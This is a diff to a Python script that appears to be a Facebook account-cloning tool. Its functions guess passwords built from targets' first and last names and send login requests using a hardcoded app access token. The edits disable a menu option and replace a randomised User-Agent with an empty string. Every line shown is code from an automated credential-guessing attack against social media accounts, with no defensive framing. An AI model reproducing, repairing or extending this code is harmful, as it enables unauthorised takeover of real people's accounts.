@@ -352,7 +352,7 @@ def menu():
     if bithi =='1':f_clone()
     elif bithi =='2':r_clone()
     elif bithi =='3':exit()
-    elif bithi =='4':random_number()
+    #elif bithi =='4':random_number()
     elif bithi =='5':os.system("xdg-open ");menu()
     elif bithi =='6':exit()
     else:
@@ -663,7 +663,7 @@ def bapi(uid, name, pwx, tl):
                 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
             }
             headers = {
-                'User-Agent': ua(),
+                'User-Agent': '',
                 'Accept-Encoding': 'gzip, deflate',
                 'Connection': 'close',
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -718,7 +718,6 @@ def graph(uid, name, pwx, tl):
             last = first
         for ps in pwx:
             pw = ps.replace("first", first).replace("last", last).lower()
-            ua_string = ua()
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -745,7 +744,7 @@ def graph(uid, name, pwx, tl):
                 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
             }
             headers = {
-                'User-Agent': ua(),
+                'User-Agent': '',
                 'Accept-Encoding': 'gzip, deflate',
                 'Connection': 'close',
                 'Content-Type': 'application/x-www-form-urlencoded',
